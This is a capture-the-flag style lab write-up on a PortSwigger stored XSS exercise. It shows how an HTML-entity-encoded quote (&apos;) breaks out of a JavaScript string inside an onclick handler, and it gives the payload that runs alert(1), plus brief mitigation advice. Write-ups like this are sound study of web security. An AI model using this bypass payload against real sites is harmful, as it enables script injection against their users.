# Lab22 - Stored XSS Into onclick Event With HTML Encoding Bypass

## Objective

Exploit a Stored XSS vulnerability where input is reflected inside an:

```html
onclick
```

handler and quotes are encoded.

Execute:

```javascript
alert(1)
```

to solve the lab.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | Stored XSS |
| Difficulty | Practitioner |
| Context | JavaScript Event Handler |
| Platform | PortSwigger |

---

# Vulnerability Overview

User input is stored and later inserted into:

```html
onclick=""
```

JavaScript context.

The application blocks direct quotes but fails to handle HTML entities correctly.

---

# Analysis

## Step 1

Submit normal input.

Example:

```text
carry123
```

---

## Step 2

Inspect rendered HTML.

Observation:

```html
onclick="trackSearch('carry123')"
```

---

## Step 3

Determine Context

Input appears inside:

```javascript
JavaScript String
```

inside an:

```html
onclick
```

attribute.

---

## Step 4

Need String Breakout

Direct quote blocked.

---

## Step 5

Use HTML Entity

```html
&apos;
```

decodes to:

```javascript
'
```

before execution.

---

# Full Payload(s) Used

```html
&apos;-alert(1)-&apos;
```

---

# Why The Payload Works

Browser Processing:

```text
HTML Entity
        ↓
HTML Decoding
        ↓
Single Quote
        ↓
JavaScript Parsing
        ↓
Execution
```

---

Payload becomes:

```javascript
'-alert(1)-'
```

after decoding.

---

# Personal Analysis & Testing Process

## Initial Observation

Input reflected inside:

```html
onclick
```

handler.

---

## Problem

Direct quotes filtered.

---

## Key Realization

HTML entities are decoded before JavaScript executes.

---

## Payload Selection

```html
&apos;-alert(1)-&apos;
```

---

## Result

```javascript
alert(1)
```

executed.

Lab solved.

---

# Mitigation

Use proper context-aware encoding.

Do not rely solely on HTML entity filtering.

---

# Related Theory

- 28-using-html-encoding-in-javascript-context.md

---

# Key Learnings

- Browser decoding frequently creates bypass opportunities.
- HTML entities can bypass weak filters.
- Event handlers require JavaScript-context testing.